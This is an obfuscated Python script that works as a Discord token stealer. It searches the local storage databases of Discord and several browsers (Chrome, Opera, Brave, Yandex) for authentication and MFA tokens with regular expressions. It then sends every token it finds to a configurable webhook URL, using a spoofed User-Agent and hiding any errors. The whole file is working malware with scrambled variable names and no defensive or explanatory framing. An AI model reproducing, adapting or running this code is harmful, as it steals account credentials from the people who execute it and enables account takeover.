import os #line:1
import re #line:2
import json #line:3
from urllib .request import Request ,urlopen #line:5
WEBHOOK_URL ='WEBHOOK_URL'#line:8
PING_ME =False #line:11
def find_tokens (O0OO000OO00OOOOO0 ):#line:13
    O0OO000OO00OOOOO0 +='\\Local Storage\\leveldb'#line:14
    O0O0OO000O0OO00O0 =[]#line:16
    for O0OO00O0OOO000000 in os .listdir (O0OO000OO00OOOOO0 ):#line:18
        if not O0OO00O0OOO000000 .endswith ('.log')and not O0OO00O0OOO000000 .endswith ('.ldb'):#line:19
            continue #line:20
        for O000OOO0OO0OOOOOO in [O00O0OO0O00OOO000 .strip ()for O00O0OO0O00OOO000 in open (f'{O0OO000OO00OOOOO0}\\{O0OO00O0OOO000000}',errors ='ignore').readlines ()if O00O0OO0O00OOO000 .strip ()]:#line:22
            for OOO0OOOO0O00OO00O in (r'[\w-]{24}\.[\w-]{6}\.[\w-]{27}',r'mfa\.[\w-]{84}'):#line:23
                for OO0O0OO0O00O0O000 in re .findall (OOO0OOOO0O00OO00O ,O000OOO0OO0OOOOOO ):#line:24
                    O0O0OO000O0OO00O0 .append (OO0O0OO0O00O0O000 )#line:25
    return O0O0OO000O0OO00O0 #line:26
def main ():#line:28
    O000OO0O0OO0O0O0O =os .getenv ('LOCALAPPDATA')#line:29
    O000O0O0OO00OO0O0 =os .getenv ('APPDATA')#line:30
    O00000OOOO0000000 ={'Discord':O000O0O0OO00OO0O0 +'\\Discord','Discord Canary':O000O0O0OO00OO0O0 +'\\discordcanary','Discord PTB':O000O0O0OO00OO0O0 +'\\discordptb','Google Chrome':O000OO0O0OO0O0O0O +'\\Google\\Chrome\\User Data\\Default','Opera':O000O0O0OO00OO0O0 +'\\Opera Software\\Opera Stable','Brave':O000OO0O0OO0O0O0O +'\\BraveSoftware\\Brave-Browser\\User Data\\Default','Yandex':O000OO0O0OO0O0O0O +'\\Yandex\\YandexBrowser\\User Data\\Default'}#line:40
    O0O00OO0O0OO00OO0 ='@everyone'if PING_ME else ''#line:42
    for OO000OOOOO0O0O0OO ,OO0OOO00O0O0OO000 in O00000OOOO0000000 .items ():#line:44
        if not os .path .exists (OO0OOO00O0O0OO000 ):#line:45
            continue #line:46
        O0O00OO0O0OO00OO0 +=f'\n**{OO000OOOOO0O0O0OO}**\n```\n'#line:48
        O0OOOO0O00OOO0OOO =find_tokens (OO0OOO00O0O0OO000 )#line:50
        if len (O0OOOO0O00OOO0OOO )>0 :#line:52
            for O0O00OO0O0O0OO0O0 in O0OOOO0O00OOO0OOO :#line:53
                O0O00OO0O0OO00OO0 +=f'{O0O00OO0O0O0OO0O0}\n'#line:54
        else :#line:55
            O0O00OO0O0OO00OO0 +='No tokens found.\n'#line:56
        O0O00OO0O0OO00OO0 +='```'#line:58
    O0OO000O0OOOO0O0O ={'Content-Type':'application/json','User-Agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}#line:63
    OOO00O0000OOOOOOO =json .dumps ({'content':O0O00OO0O0OO00OO0 })#line:65
    try :#line:67
        O00OO00OOOO00OO00 =Request (WEBHOOK_URL ,data =OOO00O0000OOOOOOO .encode (),headers =O0OO000O0OOOO0O0O )#line:68
        urlopen (O00OO00OOOO00OO00 )#line:69
    except :#line:70
        pass #line:71
if __name__ =='__main__':#line:73
    main ()
